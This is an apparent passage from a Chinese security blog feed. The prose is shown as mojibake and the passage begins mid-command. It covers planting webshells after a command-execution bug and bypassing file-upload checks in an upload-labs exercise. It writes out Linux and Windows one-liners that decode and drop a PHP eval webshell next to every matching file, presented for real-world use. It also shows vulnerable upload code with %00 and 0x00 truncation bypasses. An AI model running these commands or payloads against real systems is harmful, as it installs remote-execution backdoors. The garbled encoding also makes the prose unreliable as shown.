[æŸ¥æ‰¾çš„æ–‡ä»¶]|while read file;do sh -c &quot;echo [base64ç¼–ç çš„å†…å®¹] | base64 -d&quot;&gt;$(dirname $file)/[å†™å…¥çš„æ–‡ä»¶åå­—];done</span><br></pre></td></tr></table></figure><p>å‘½ä»¤å®ä¾‹åŒ–ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name 1.jpg|while read file;do sh -c &quot;echo PD9waHAgZXZhbCgkX1JFUVVFU1RbMV0pOyA/Pgo= | base64 -d&quot;&gt;$(dirname $file)/1.php;done</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œå®Œæ¯•ä»¥åï¼Œlinuxä¸Šæ‰€æœ‰å« 1.jpg çš„æ–‡ä»¶åŒçº§ç›®å½•å°±éƒ½ä¼šå†™å…¥ä¸€ä¸ª 1.php æ–‡ä»¶äº†</p><p>æ¥ç€æˆ‘ä»¬è®¿é—® <a href="http://127.0.0.1/upload/2020/11/11/1.php" target="_blank" rel="noopener">http://127.0.0.1/upload/2020/11/11/1.php</a></p><p>å°±å¯ä»¥çœ‹åˆ°ç«™ç‚¹å†™å…¥äº†ä¸€ä¸ª 1.php æ–‡ä»¶</p><p>å†…å®¹ä¸º:</p><h1 id="linuxä¸‹base64ç¼–ç å†™shell"><a href="#linuxä¸‹base64ç¼–ç å†™shell" class="headerlink" title="linuxä¸‹base64ç¼–ç å†™shell"></a>linuxä¸‹base64ç¼–ç å†™shell</h1><p>0x01 ä¾‹å­</p><p>0x1.1 ä¾‹å­ä¸€</p><p>éœ€æ±‚å†™å…¥ åˆ° 1.php æ–‡ä»¶ä¸­<br>å‰ç½®æ¡ä»¶-å†…å®¹ç¼–ç <br>å‘½ä»¤ï¼šecho â€˜â€™ | base64</p><p>è¿”å›ï¼šPD9waHAgZXZhbCgkX1JFUVVFU1RbMV0pOyA/Pgo=<br>å†™shellï¼š<br>æŠŠbase64ç¼–ç çš„å†…å®¹,è§£å¯†å†™å…¥ä¸€ä¸ªåˆ°1.phpé‡Œé¢</p><p>å‘½ä»¤ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo PD9waHAgZXZhbCgkX1JFUVVFU1RbMV0pOyA/Pgo= | base64 -d &gt; 1.php</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œå®Œæ¯•ä»¥åä¼šå‡ºç°ä¸€ä¸ªæ–‡ä»¶ï¼š1.php<br>å†…å®¹æ˜¯ï¼š</p><h1 id="linuxä¸‹base64å‘½ä»¤åŠ è§£å¯†"><a href="#linuxä¸‹base64å‘½ä»¤åŠ è§£å¯†" class="headerlink" title="linuxä¸‹base64å‘½ä»¤åŠ è§£å¯†"></a>linuxä¸‹base64å‘½ä»¤åŠ è§£å¯†</h1><p>0x01 å‰è¨€<br>linuxä¸‹ä½¿ç”¨base64å‘½ä»¤åŠ è§£å¯†å­—ç¬¦ä¸²çš„æ–¹æ³•</p><p>0x02 åŠ å¯†</p><p>0x02.1 æ™®é€šåŠ å¯†</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">å‘½ä»¤ï¼šecho &apos;è¦ç¼–ç çš„å†…å®¹&apos; | base64</span><br><span class="line">å‘½ä»¤å®ä¾‹åŒ–ï¼šecho &apos;1234&apos; | base64</span><br><span class="line"> </span><br><span class="line">è¿”å›: MTIzNAo=</span><br></pre></td></tr></table></figure><p>0x02.2 è¯»å–æŸä¸ªæ–‡ä»¶å†…å®¹åŠ å¯†</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">å‘½ä»¤ï¼šbase64 [è¦ç¼–ç çš„æ–‡ä»¶åå­—]</span><br><span class="line">ä¾‹å­ï¼š</span><br><span class="line">ç°åœ¨æœ‰ä¸ªæ–‡ä»¶ 1.txt</span><br><span class="line">å†…å®¹æ˜¯ï¼š1234</span><br><span class="line">ç°åœ¨è¦æŠŠå®ƒç¼–ç è¾“å‡º</span><br><span class="line"> </span><br><span class="line">å‘½ä»¤å®ä¾‹ï¼šbase64 ./1.txt</span><br><span class="line"> </span><br><span class="line">è¿”å›: MTIzNA==</span><br></pre></td></tr></table></figure><p>0x03 è§£å¯†</p><p>0x03.1 æ™®é€šè§£å¯†</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">å‘½ä»¤: echo [è¦è§£ç çš„å†…å®¹] | base64 -d</span><br><span class="line">å‘½ä»¤å®ä¾‹åŒ–: echo MTIzNA== | base64 -d</span><br><span class="line"> </span><br><span class="line">è¿”å›: 1234</span><br></pre></td></tr></table></figure><p>0x03.2 è¯»å–æŸä¸ªæ–‡ä»¶å†…å®¹è§£å¯†</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">å‘½ä»¤ï¼šbase64 -d [è¦è§£å¯†çš„æ–‡ä»¶åå­—]</span><br><span class="line">ä¾‹å­ï¼š</span><br><span class="line">ç°åœ¨æœ‰ä¸ªæ–‡ä»¶ 2.txt</span><br><span class="line">å†…å®¹æ˜¯ï¼šMTIzNA==</span><br><span class="line">ç°åœ¨è¦æŠŠå®ƒè§£ç è¾“å‡º</span><br><span class="line"> </span><br><span class="line">å‘½ä»¤å®ä¾‹ï¼šbase64 -d ./2.txt</span><br><span class="line"> </span><br><span class="line">è¿”å›: 1234</span><br></pre></td></tr></table></figure><h1 id="windows-æŸ¥æ‰¾æŸä¸ªæ–‡ä»¶å¹¶å†™å…¥ä¸ªæ–°æ–‡ä»¶"><a href="#windows-æŸ¥æ‰¾æŸä¸ªæ–‡ä»¶å¹¶å†™å…¥ä¸ªæ–°æ–‡ä»¶" class="headerlink" title="windows æŸ¥æ‰¾æŸä¸ªæ–‡ä»¶å¹¶å†™å…¥ä¸ªæ–°æ–‡ä»¶"></a>windows æŸ¥æ‰¾æŸä¸ªæ–‡ä»¶å¹¶å†™å…¥ä¸ªæ–°æ–‡ä»¶</h1><p>0x01 å‰è¨€<br>åœ¨å®æˆ˜ä¸­æˆ‘ä»¬å¯èƒ½æŒ–åˆ°äº†ä¸€ä¸ªå‘½ä»¤æ‰§è¡Œä½†æ˜¯å› ä¸ºæ‰¾ä¸åˆ°ç›®å½•è€Œæ— æ³•å†™shellã€‚</p><p>é‚£ä¹ˆè¿™ç§æƒ…å†µæœ¬ç¯‡æ–‡ç« å°±å¯ä»¥æ´¾ä¸Šç”¨åœºäº† : )</p><p>ä½œç”¨ï¼šæŸ¥æ‰¾ç³»ç»Ÿçš„æŸä¸ªæ–‡ä»¶å¹¶åœ¨é‚£ä¸ªæ–‡ä»¶çš„åŒçº§ç›®å½•ä¸‹å†™å…¥æˆ‘ä»¬çš„æ–°æ–‡ä»¶</p><p>0x02 å‘½ä»¤<br>[è§„å®šæŸ¥æ‰¾çš„ç›˜ç¬¦] ä¾‹å¦‚: cç›˜, dç›˜, eç›˜, fç›˜<br>[æŸ¥æ‰¾çš„æ–‡ä»¶] ä¾‹å¦‚ï¼šindex.php<br>[å†™å…¥çš„å†…å®¹] ä¾‹å¦‚ï¼š<br>[å†™å…¥çš„æ–‡ä»¶åå­—] ä¾‹å¦‚ï¼šhm.php</p><p>å‘½ä»¤ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for /f %i in (&apos;dir /s /b [è§„å®šæŸ¥æ‰¾çš„ç›˜ç¬¦]:\[æŸ¥æ‰¾çš„æ–‡ä»¶]&apos;) do (echo &quot;[å†™å…¥çš„å†…å®¹]&quot; &gt; %i\..\[å†™å…¥çš„æ–‡ä»¶åå­—])</span><br></pre></td></tr></table></figure><p>å‘½ä»¤å®ä¾‹åŒ–ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for /f %i in (&apos;dir /s /b c:\index.php&apos;) do (echo &quot;&lt;?php eval($_REQUEST[1]); ?&gt;&quot; &gt; %i\..\hm.php)</span><br></pre></td></tr></table></figure><p>0x03 ä¾‹å­<br>åœºæ™¯ï¼š</p><p>ç°åœ¨æˆ‘ä»¬æœ‰ä¸€ä¸ªå‘½ä»¤æ‰§è¡Œæ¼æ´ï¼Œä½†æ˜¯æ‰¾ä¸åˆ°ç«™ç‚¹çš„ç›®å½•æ— æ³•å†™shellï¼Œäºæ˜¯å°±æƒ³æ‰¹é‡æŸ¥æ‰¾æŸä¸ªæ–‡ä»¶å¹¶åœ¨è¿™ä¸ªæ–‡ä»¶ä¸‹å†™å…¥æˆ‘ä»¬è‡ªå·±çš„æ–‡ä»¶</p><p>æŸ¥çœ‹ç«™ç‚¹å‘ç°äº†ä¸€å¼ å›¾ç‰‡ <a href="http://127.0.0.1/upload/2020/11/11/1.jpg" target="_blank" rel="noopener">http://127.0.0.1/upload/2020/11/11/1.jpg</a></p><p>ä½†æ˜¯æ— æ³•å¾—çŸ¥è·¯å¾„ï¼Œè¿™ç§æƒ…å†µä¸‹å°±å¯ä»¥ä½¿ç”¨ä¸‹é¢çš„å‘½ä»¤æ‰¹é‡æŸ¥æ‰¾å†™å…¥äº†</p><p>0x03.1 ä¾‹å­ä¸€ - æ™®é€šå†™å…¥<br>æŸ¥æ‰¾cç›˜ä¸‹é¢æ‰€æœ‰å« 1.jpg çš„æ–‡ä»¶<br>å¹¶ä¸”åœ¨åŒçº§ç›®å½•å†™å…¥ä¸€ä¸ªæ–‡ä»¶ test.txt<br>æ–‡ä»¶å†…å®¹ä¸º 123</p><p>å‘½ä»¤ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for /f %i in (&apos;dir /s /b c:\1.jpg&apos;) do (echo &quot;123&quot; &gt; %i\..\test.txt)</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œå®Œæ¯•ä»¥åï¼Œcç›˜æ‰€æœ‰å« 1.jpg çš„æ–‡ä»¶åŒçº§ç›®å½•å°±éƒ½ä¼šå†™å…¥ä¸€ä¸ª test.txt æ–‡ä»¶äº†</p><p>æ¥ç€æˆ‘ä»¬è®¿é—® <a href="http://127.0.0.1/upload/2020/11/11/test.txt" target="_blank" rel="noopener">http://127.0.0.1/upload/2020/11/11/test.txt</a></p><p>å°±å¯ä»¥çœ‹åˆ°ç«™ç‚¹å†™å…¥äº†ä¸€ä¸ª test.txt æ–‡ä»¶</p><p>å†…å®¹ä¸º: 123</p><p>0x03.2 ä¾‹å­äºŒ - base64å†™shell<br>æŸ¥æ‰¾cç›˜ä¸Šæ‰€æœ‰å« 1.jpg çš„æ–‡ä»¶<br>å¹¶ä¸”åœ¨åŒçº§ç›®å½•å†™å…¥ä¸€ä¸ªæ–‡ä»¶ 1.php<br>æ–‡ä»¶å†…å®¹ä¸º<br>PD9waHAgZXZhbCgkX1JFUVVFU1RbMV0pOyA/Pgo= è§£ç ç­‰äº</p><h1 id="ç¬¬ä¸€æ­¥"><a href="#ç¬¬ä¸€æ­¥" class="headerlink" title="ç¬¬ä¸€æ­¥"></a>ç¬¬ä¸€æ­¥</h1><h1 id="å…ˆæŸ¥æ‰¾cç›˜ä¸Šæ‰€æœ‰å«-1-jpg-çš„æ–‡ä»¶ï¼Œç„¶åæŠŠbase64ç¼–ç å†…å®¹å†™å…¥åˆ°-base64-hm-test-txt-æ–‡ä»¶é‡Œé¢"><a href="#å…ˆæŸ¥æ‰¾cç›˜ä¸Šæ‰€æœ‰å«-1-jpg-çš„æ–‡ä»¶ï¼Œç„¶åæŠŠbase64ç¼–ç å†…å®¹å†™å…¥åˆ°-base64-hm-test-txt-æ–‡ä»¶é‡Œé¢" class="headerlink" title="å…ˆæŸ¥æ‰¾cç›˜ä¸Šæ‰€æœ‰å« 1.jpg çš„æ–‡ä»¶ï¼Œç„¶åæŠŠbase64ç¼–ç å†…å®¹å†™å…¥åˆ° base64-hm-test.txt æ–‡ä»¶é‡Œé¢"></a>å…ˆæŸ¥æ‰¾cç›˜ä¸Šæ‰€æœ‰å« 1.jpg çš„æ–‡ä»¶ï¼Œç„¶åæŠŠbase64ç¼–ç å†…å®¹å†™å…¥åˆ° base64-hm-test.txt æ–‡ä»¶é‡Œé¢</h1><p>[è§„å®šæŸ¥æ‰¾çš„ç›˜ç¬¦] ä¾‹å¦‚: cç›˜, dç›˜, eç›˜, fç›˜<br>[æŸ¥æ‰¾çš„æ–‡ä»¶] ä¾‹å¦‚ï¼š1.jpg<br>[base64ç¼–ç çš„å†…å®¹] æ²¡å•¥å¥½è¯´çš„ï¼ŒæŠŠæƒ³å†™çš„å†…å®¹base64ç¼–ç ç„¶åç»™è¿™ä¸ªå‚æ•°å³å¯<br>[å†™å…¥çš„æ–‡ä»¶åå­—] ä¾‹å¦‚ï¼š1.php</p><p>å‘½ä»¤ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for /f %i in (&apos;dir /s /b [è§„å®šæŸ¥æ‰¾çš„ç›˜ç¬¦]:\[æŸ¥æ‰¾çš„æ–‡ä»¶]&apos;) do (echo [base64ç¼–ç çš„å†…å®¹] &gt; %i\..\[å†™å…¥çš„æ–‡ä»¶åå­—])</span><br></pre></td></tr></table></figure><p>å®ä¾‹æ‰§è¡Œå‘½ä»¤-å†™base64æ–‡ä»¶åˆ°è§„å®šçš„è·¯å¾„ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for /f %i in (&apos;dir /s /b c:\1.jpg&apos;) do (echo PD9waHAgZXZhbCgkX1JFUVVFU1RbMV0pOyA/Pgo= &gt; %i\..\base64-hm-test.txt)</span><br></pre></td></tr></table></figure><h1 id="ç¬¬äºŒæ­¥"><a href="#ç¬¬äºŒæ­¥" class="headerlink" title="ç¬¬äºŒæ­¥"></a>ç¬¬äºŒæ­¥</h1><h1 id="åœ¨æ‰¾åˆ°ç¬¬ä¸€æ­¥å†™å…¥çš„æ–‡ä»¶ï¼Œè¿›è¡Œbase64è§£ç ä»¥åè¿›è¡ŒäºŒæ¬¡å†™é©¬"><a href="#åœ¨æ‰¾åˆ°ç¬¬ä¸€æ­¥å†™å…¥çš„æ–‡ä»¶ï¼Œè¿›è¡Œbase64è§£ç ä»¥åè¿›è¡ŒäºŒæ¬¡å†™é©¬" class="headerlink" title="åœ¨æ‰¾åˆ°ç¬¬ä¸€æ­¥å†™å…¥çš„æ–‡ä»¶ï¼Œè¿›è¡Œbase64è§£ç ä»¥åè¿›è¡ŒäºŒæ¬¡å†™é©¬"></a>åœ¨æ‰¾åˆ°ç¬¬ä¸€æ­¥å†™å…¥çš„æ–‡ä»¶ï¼Œè¿›è¡Œbase64è§£ç ä»¥åè¿›è¡ŒäºŒæ¬¡å†™é©¬</h1><p>[è§„å®šæŸ¥æ‰¾çš„ç›˜ç¬¦] ä¾‹å¦‚: cç›˜, dç›˜, eç›˜, fç›˜<br>[æŸ¥æ‰¾çš„æ–‡ä»¶] ä¾‹å¦‚ï¼šbase64-hm-test.txt<br>[è¦è§£ç çš„æ–‡ä»¶åå­—] ä¾‹å¦‚ï¼šbase64-hm-test.txt<br>[å†™å…¥çš„æ–‡ä»¶åå­—] ä¾‹å¦‚ï¼š1.php</p><p>å‘½ä»¤ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for /f %i in (&apos;dir /s /b [è§„å®šæŸ¥æ‰¾çš„ç›˜ç¬¦]:\[æŸ¥æ‰¾çš„æ–‡ä»¶]&apos;) do (certutil.exe -decode %i\..\[è¦è§£ç çš„æ–‡ä»¶åå­—] %i\..\[å†™å…¥çš„æ–‡ä»¶åå­—])</span><br></pre></td></tr></table></figure><p>å®ä¾‹æ‰§è¡Œå‘½ä»¤ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for /f %i in (&apos;dir /s /b c:\base64-hm-test.txt&apos;) do (certutil.exe -decode %i\..\base64-hm-test.txt %i\..\1.php)</span><br></pre></td></tr></table></figure><p>å®Œæ¯•</p><p>æ‰§è¡Œå®Œæ¯•ä»¥åï¼Œcç›˜æ‰€æœ‰å« 1.jpg çš„æ–‡ä»¶åŒçº§ç›®å½•å°±éƒ½ä¼šå†™å…¥ä¸€ä¸ª 1.php æ–‡ä»¶äº†</p><p>æ¥ç€æˆ‘ä»¬è®¿é—® <a href="http://127.0.0.1/upload/2020/11/11/1.php" target="_blank" rel="noopener">http://127.0.0.1/upload/2020/11/11/1.php</a></p><p>å°±å¯ä»¥çœ‹åˆ°ç«™ç‚¹å†™å…¥äº†ä¸€ä¸ª 1.php æ–‡ä»¶</p><p>å†…å®¹ä¸º:</p><h1 id="windows-base64ç¼–ç å†™shell"><a href="#windows-base64ç¼–ç å†™shell" class="headerlink" title="windows base64ç¼–ç å†™shell"></a>windows base64ç¼–ç å†™shell</h1><p>0x01 ä¾‹å­<br>0x1.1 ä¾‹å­ä¸€<br>éœ€æ±‚å†™å…¥ åˆ° 1.php æ–‡ä»¶ä¸­<br>å‰ç½®æ¡ä»¶-å†…å®¹ç¼–ç <br>æœ¬æœºæ‰§è¡Œï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil -f -encode data.txt base64-data.txt</span><br></pre></td></tr></table></figure><p>è¿”å›ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN CERTIFICATE-----</span><br><span class="line">PD9waHAgZXZhbCgkX1JFUVVFU1RbMV0pOyA/Pg==</span><br><span class="line">-----END CERTIFICATE-----</span><br></pre></td></tr></table></figure><p>å†™shellï¼š</p><p>å—å®³è€…æœºå™¨ä¸Šæ‰§è¡Œå‘½ä»¤ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo PD9waHAgZXZhbCgkX1JFUVVFU1RbMV0pOyA/Pg== &gt; ./base64-data-1.txt</span><br></pre></td></tr></table></figure><p>æ¥ç€æ‰§è¡Œï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil -f -decode ./base64-data-1.txt ./1.php</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œå®Œæ¯•ä»¥åä¼šå‡ºç°ä¸€ä¸ªæ–‡ä»¶ï¼š1.php<br>å†…å®¹æ˜¯ï¼š</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2021/11/08/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E-%E8%A7%A3%E6%9E%90%E3%80%81%E9%AA%8C%E8%AF%81%E3%80%81%E4%BC%AA%E9%80%A0(%E4%BA%8C)/"/>
      <url>/2021/11/08/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E-%E8%A7%A3%E6%9E%90%E3%80%81%E9%AA%8C%E8%AF%81%E3%80%81%E4%BC%AA%E9%80%A0(%E4%BA%8C)/</url>
      
        <content type="html"><![CDATA[<p>æˆ‘ä»¬æ¥ç€ä¸Šä¸€ç¯‡æ–‡ç« å¯¹æ–‡ä»¶ä¸Šä¼ æ¼æ´çš„è®²è§£ï¼š</p><h2 id="00æˆªæ–­ç»•è¿‡"><a href="#00æˆªæ–­ç»•è¿‡" class="headerlink" title="%00æˆªæ–­ç»•è¿‡"></a>%00æˆªæ–­ç»•è¿‡</h2><p>æˆ‘ä»¬è¿›å…¥11å…³</p><p><img src="1.assets/image-20211108155042275.png" alt="image-20211108155042275"></p><p>æœ¬å…³çš„æç¤ºæ˜¯%00æˆªæ–­ï¼Œæˆ‘ä»¬å…ˆä¸ç®¡ï¼Œå…ˆçœ‹ä¸‹æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $ext_arr = <span class="keyword">array</span>(<span class="string">'jpg'</span>,<span class="string">'png'</span>,<span class="string">'gif'</span>);</span><br><span class="line">    $file_ext = substr($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>],strrpos($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>],<span class="string">"."</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">        $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">        $img_path = $_GET[<span class="string">'save_path'</span>].<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_ext;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'ä¸Šä¼ å‡ºé”™ï¼'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        $msg = <span class="string">"åªå…è®¸ä¸Šä¼ .jpg|.png|.gifç±»å‹æ–‡ä»¶ï¼"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬é€šè¿‡ä»£ç åˆ†æå¯ä»¥å‘ç°ä»–ä¼šå°†ä¸Šä¼ æ–‡ä»¶è¿›è¡Œé‡å‘½åå¹¶å­˜åˆ°æŒ‡å®šè·¯å¾„ä¸­</p><p><img src="1.assets/image-20211108155236124.png" alt="image-20211108155236124"></p><p>ç”±äºå­˜å‚¨è·¯å¾„æ˜¯éšç€POSTè¡¨å•ä¼ é€’çš„ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬èƒ½æ§åˆ¶çš„</p><p>é‚£æˆ‘ä»¬èƒ½ä¸èƒ½é€šè¿‡åœ¨å­˜å‚¨è·¯å¾„è¿›è¡Œ%00æˆªæ–­</p><p><img src="1.assets/image-20211108160456145.png" alt="image-20211108160456145"></p><p>æˆåŠŸä¸Šä¼ å¹¶å°†æ–‡ä»¶åæˆåŠŸæˆªæ–­</p><p><img src="1.assets/image-20211108174405386.png" alt="image-20211108174405386"></p><p>æ–‡ä»¶åœ¨ä¸Šä¼ çš„æ—¶å€™ï¼Œä¼šå…ˆå°†æ–‡ä»¶æ”¾åˆ°ä¸´æ—¶ç›®å½•ï¼Œå†å°†æ–‡ä»¶è½¬ç§»åˆ°æŒ‡å®šçš„ç›®å½•å¹¶é‡æ–°å‘½åï¼Œåœ¨æ‰§è¡Œè½¬ç§»æ—¶phpè¯»å–åˆ°%00æ—¶ä¼šå°†å…¶å½“æˆä¸€ä¸ªç»“æŸç¬¦ï¼Œç„¶åå¹¶ä¸ä¼šå»è¯»å–åé¢çš„å†…å®¹ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸Šä¼ ä¸€ä¸ªjpgæ–‡ä»¶åï¼Œæˆ‘ä»¬é¡ºåˆ©é€šè¿‡%00æˆªæ–­åè¢«å½“phpæ–‡ä»¶å»æ‰§è¡Œäº†ï¼Œæœ€åæˆ‘ä»¬é€šè¿‡phpinfo(),éªŒè¯æ˜¯å¦ä¸Šä¼ æˆåŠŸ</p><p><img src="1.assets/image-20211108174742742.png" alt="image-20211108174742742"></p><p>æˆåŠŸæ‰§è¡Œ</p><h2 id="00æˆªæ–­ç»•è¿‡ï¼ˆäºŒï¼‰"><a href="#00æˆªæ–­ç»•è¿‡ï¼ˆäºŒï¼‰" class="headerlink" title="%00æˆªæ–­ç»•è¿‡ï¼ˆäºŒï¼‰"></a>%00æˆªæ–­ç»•è¿‡ï¼ˆäºŒï¼‰</h2><p>è¿›å…¥12å…³ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $ext_arr = <span class="keyword">array</span>(<span class="string">'jpg'</span>,<span class="string">'png'</span>,<span class="string">'gif'</span>);</span><br><span class="line">    $file_ext = substr($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>],strrpos($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>],<span class="string">"."</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">        $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">        $img_path = $_POST[<span class="string">'save_path'</span>].<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_ext;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">"ä¸Šä¼ å¤±è´¥"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = <span class="string">"åªå…è®¸ä¸Šä¼ .jpg|.png|.gifç±»å‹æ–‡ä»¶ï¼"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å‘ç°ä¸ä¸Šä¸€å…³å¾ˆç›¸ä¼¼ï¼Œåªæ˜¯æœ‰ä¸€ä¸ªå‡½æ•°æ”¹ä¸ºé€šè¿‡postè¿›è¡Œä¼ å‚æäº¤è·¯å¾„æ–‡ä»¶åï¼Œæˆ‘ä»¬å…ˆå°†ä¸€å¥è¯æœ¨é©¬ä¸Šä¼ å¹¶æŠ“åŒ…ï¼š</p><p><img src="1.assets/image-20211108175020189.png" alt="image-20211108175020189"></p><p>æˆ‘ä»¬å‘ç°å®ƒæ˜¯é€šè¿‡postè¿›è¡Œä¼ æ‰¿ï¼Œé‚£æˆ‘ä»¬å†æ¬¡è¿›è¡Œ00æˆªæ–­ï¼Œä½†posté»˜è®¤æ˜¯æ— æ³•è¿›è¡Œurlç¼–ç çš„ï¼Œé™¤éå£°æ˜è¡¨å•ç¼–ç æ ¼å¼ï¼Œæ‰€ä»¥æˆ‘ä»¬é€šè¿‡hexå€¼0x00è¿›è¡Œæˆªæ–­</p><p>ä¸ºäº†å¥½æ‰¾ï¼Œè¿™é‡Œæˆ‘ç”¨+å·</p><p><img src="1.assets/image-20211108175226144.png" alt="image-20211108175226144"></p><p><img src="1.assets/image-20211108175310242.png" alt="image-20211108175310242"></p><p>ä¿®æ”¹åä¸Šä¼ ï¼Œå‘ç°æˆåŠŸä¸Šä¼ ï¼Œå¦‚å›¾</p><p><img src="1.assets/image-20211108175402180.png" alt="image-20211108175402180"></p><p>æœ€åé€šè¿‡phpinfo()éªŒè¯ï¼Œå‘ç°æˆªæ–­æˆåŠŸï¼ŒæˆåŠŸå°†é‡å‘½åæˆªæ–­åœ¨æ–‡ä»¶åå¤–ï¼›</p><p><img src="1.assets/image-20211108175458022.png" alt="image-20211108175458022"></p><h2 id="å›¾ç‰‡é©¬ä¹‹æ–‡ä»¶å¤´ç»•è¿‡"><a href="#å›¾ç‰‡é©¬ä¹‹æ–‡ä»¶å¤´ç»•è¿‡" class="headerlink" 